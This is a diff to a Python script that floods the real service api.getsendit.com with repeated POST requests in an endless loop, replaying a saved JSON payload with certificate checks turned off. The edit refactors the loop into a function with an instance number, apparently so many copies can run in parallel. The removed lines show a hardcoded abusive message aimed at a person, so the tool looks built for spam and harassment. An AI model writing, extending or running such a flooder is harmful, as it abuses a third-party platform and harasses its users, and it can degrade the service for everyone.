@@ -5,8 +5,6 @@ import urllib3
 import sys
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-question = "FUCK LP (gaga)"
-
 headers = {
     'Host': 'api.getsendit.com',
     'Content-Length': '354',
@@ -26,20 +24,18 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9',
 }
 
-# change this with your JSON payload file
-with open('/home/kali/Desktop/json_payload.txt', 'r') as f:
-    data = f.read()
 
-rqs = 0
+def main(json_payload,instance_number):
+    rqs = 0
 
-while True:
-    try:
-        response = requests.post('https://api.getsendit.com/v1/posts',
-        headers=headers, data=data, verify=False,timeout=0.9)
-        if (response.json()['status'] == 'success'):
-            rqs = rqs + 1
-            print('\033[92m'+f'[*] REQUEST SUCCESS | Requests: {rqs}')
-        else:
-            print('\033[91m[*] REQUEST ERROR')
-    except:
-        print('\033[91m[*] ERROR, UNKNOWN')
+    while True:
+        try:
+            response = requests.post('https://api.getsendit.com/v1/posts',
+            headers=headers, data=json_payload, verify=False,timeout=0.9)
+            if (response.json()['status'] == 'success'):
+                rqs = rqs + 1
+                print(f'\033[92m'+f'[*] REQUEST SUCCESS | instance: {instance_number}')
+            else:
+                print(f"\033[91m[*]NETWORK ERROR| instance: {instance_number}")
+        except:
+            print(f"\033[91m[*]UNKNOWN ERROR | instance: {instance_number}")
